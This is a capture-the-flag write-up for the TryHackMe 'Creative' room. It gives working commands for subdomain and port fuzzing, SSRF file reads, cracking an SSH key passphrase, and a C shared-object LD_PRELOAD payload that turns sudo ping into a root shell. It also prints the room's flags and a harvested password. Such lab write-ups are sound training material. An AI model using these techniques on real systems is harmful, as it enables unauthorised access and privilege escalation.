## Creative - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/creative)

**IP: creative.thm**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, Ffuf, John<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster as always.

  ```
  $ nmap -sC -sV -p- creative.thm

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 7d:3a:4b:fc:c8:0b:88:f6:fe:29:21:d8:38:7c:c2:3e (RSA)
  |   256 17:06:ed:c7:67:f4:4c:3a:63:2b:32:a0:ca:7a:44:39 (ECDSA)
  |_  256 4e:f6:24:9c:42:18:8e:a2:06:76:cf:53:e5:81:ed:39 (ED25519)
  80/tcp open  http    nginx 1.18.0 (Ubuntu)
  |_http-title: Creative Studio | Free Bootstrap 4.3.x template
  |_http-server-header: nginx/1.18.0 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  $ gobuster dir -u http://creative.thm/ -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /assets               (Status: 301) [Size: 178] [--> http://creative.thm/assets/]
  /index.html           (Status: 200) [Size: 37589]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- Since there's absolutely nothing, let's fuzz for subdomains.

  ```
  $ ffuf -w /seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://creative.thm/ -H "Host:FUZZ.creative.thm" -fw 6 

  beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 61ms]
  :: Progress: [114442/114442] :: Job [1/1] :: 784 req/sec :: Duration: [0:02:36] :: Errors: 0 ::
  ```
  
- Add that subdomain to `/etc/hosts` and let's exploit it.

---

## 🌐 Web Exploitation 

- When you visit the beta subdomain you already know it's vulnerable to SSRF, so there must be some other service running on some port since this payload was successful `http://127.0.0.1/../../../../../etc/passwd`. 

- I tried SSRFMap tool but it didn't work, so I made a wordlist of all the ports and fuzzed for ones that are open.

  ```
  $ seq 65535 > ports.txt 

  $ ffuf -w ports.txt -u http://beta.creative.thm/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://127.0.0.1:FUZZ" -fw 3
  
  80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 251ms]
  1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 168ms]
  ```

- Now when you test that port on URL tester you will get this:

  ```
  http://127.0.0.1:1337

  Directory listing for /
  
      .badr-info
      bin@
      boot/
      dev/
      etc/
      home/
      lib@
      lib32@
      lib64@
      libx32@
      lost+found/
      media/
      mnt/
      opt/
      proc/
      root/
      run/
      sbin@
      snap/
      srv/
      swap.img
      sys/
      tmp/
      usr/
      var/
  ```

- Now just keep digging until you find a flag.

  ```
  http://127.0.0.1:1337/home/saad/user.txt
  9a1ce90a7653d74ab98630b47b8b4a84
  ```

- Here we can also read `saad` RSA key in the source code.

  ```
  http://127.0.0.1:1337/home/saad/.ssh/id_rsa 

  -----BEGIN OPENSSH PRIVATE KEY-----
  [SNIP!]
  -----END OPENSSH PRIVATE KEY-----
  ```

- Save the key, crack it's hash in order to get a passphrase and login with SSH. After that move to root escalation.

  ```
  $ ssh2john id_rsa > saad.hash

  $ john --wordlist=/rockyou.txt saad.hash 
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
  Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
  Cost 2 (iteration count) is 16 for all loaded hashes
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  sweetness        (id_rsa)     
  1g 0:00:00:46 DONE (2025-06-08 18:44) 0.02137g/s 20.52p/s 20.52c/s 20.52C/s whitney..sandy
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed.

  $ chmod 400 id_rsa

  $ ssh -i id_rsa saad@10.10.26.41                              
  Enter passphrase for key 'id_rsa': 
  
  Last login: Mon Nov  6 07:56:40 2023 from 192.168.8.102
  saad@ip-10-10-26-41:~$ whoami
  saad
  saad@ip-10-10-26-41:~$ id
  uid=1000(saad) gid=1000(saad) groups=1000(saad)
  ```

---

## 👑 Root Privilege Escalation

- Now read the `.bash_history` so we can get a password in order to use `sudo -l`.

  ```
  saad@ip-10-10-26-41:~$ cat .bash_history 
  whoami
  pwd
  ls -al
  ls
  cd ..
  sudo -l
  echo "saad:MyStrongestPasswordYet$4291" > creds.txt
  rm creds.txt
  sudo -l
  whomai
  whoami
  pwd
  ls -al
  sudo -l
  ls -al
  pwd
  whoami
  mysql -u root -p
  netstat -antlp
  mysql -u root
  sudo su
  ssh root@192.169.155.104
  mysql -u user -p
  mysql -u db_user -p
  ls -ld /var/lib/mysql
  ls -al
  cat .bash_history 
  cat .bash_logout 
  nano .bashrc 
  ls -al
  
  saad@ip-10-10-26-41:~$ sudo -l
  [sudo] password for saad: 
  Matching Defaults entries for saad on ip-10-10-26-41:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
  
  User saad may run the following commands on ip-10-10-26-41:
      (root) /usr/bin/ping
  ```
  
- Exploiting `LD_PRELOAD` is the same as exploitin `LD_LIBRARY_PATH`. You have a full guide on [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=ping%20privilege#binaries-capabilities).

- Move to `/tmp`, create a C file, paste the code, compile it and then run it with PATH and SUDO command that we can use. It's the same as for `LD_LIBRARY_PATH` exploitation which I covered in `Hijack` CTF.

  ```
  saad@ip-10-10-26-41:~$ cd /tmp
  saad@ip-10-10-26-41:/tmp$ ls -al
  total 48
  drwxrwxrwt 12 root root 4096 Jun  8 17:36 .
  drwxr-xr-x 19 root root 4096 Jun  8 16:48 ..
  drwxrwxrwt  2 root root 4096 Jun  8 16:48 .font-unix
  drwxrwxrwt  2 root root 4096 Jun  8 16:48 .ICE-unix
  drwx------  3 root root 4096 Jun  8 16:48 snap-private-tmp
  drwx------  3 root root 4096 Jun  8 16:48 systemd-private-c79877c89e91457dba4e8fb2affc7112-ModemManager.service-ZVyBEg
  drwx------  3 root root 4096 Jun  8 16:48 systemd-private-c79877c89e91457dba4e8fb2affc7112-systemd-logind.service-Lv9JBi
  drwx------  3 root root 4096 Jun  8 16:48 systemd-private-c79877c89e91457dba4e8fb2affc7112-systemd-resolved.service-ZNPm0e
  drwx------  3 root root 4096 Jun  8 16:48 systemd-private-c79877c89e91457dba4e8fb2affc7112-systemd-timesyncd.service-4guPig
  drwxrwxrwt  2 root root 4096 Jun  8 16:48 .Test-unix
  drwxrwxrwt  2 root root 4096 Jun  8 16:48 .X11-unix
  drwxrwxrwt  2 root root 4096 Jun  8 16:48 .XIM-unix
  saad@ip-10-10-26-41:/tmp$ nano pe.c
  saad@ip-10-10-26-41:/tmp$ cat pe.c 
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>
  
  void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
  }
  
  saad@ip-10-10-26-41:/tmp$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
  pe.c: In function ‘_init’:
  pe.c:7:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
      7 |     setgid(0);
        |     ^~~~~~
  pe.c:8:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
      8 |     setuid(0);
        |     ^~~~~~
  ```

- Lastly, just run the exploit and read the flag.

  ```
  saad@ip-10-10-26-41:/tmp$ sudo LD_PRELOAD=./pe.so /usr/bin/ping
  root@ip-10-10-26-41:/tmp# whoami
  root
  root@ip-10-10-26-41:/tmp# id
  uid=0(root) gid=0(root) groups=0(root)
  root@ip-10-10-26-41:/tmp# cat /root/root.txt
  992bfd94b90da48634aed182aae7b99f
  ```

---

## 🏁 Flags

- **User Flag**: `9a1ce90a7653d74ab98630b47b8b4a84`
- **Root Flag**: `992bfd94b90da48634aed182aae7b99f`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Exploiting SSRF.`

- What did I learn?
  `SSRF exploitation and finally tried LD_PRELOAD escalation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
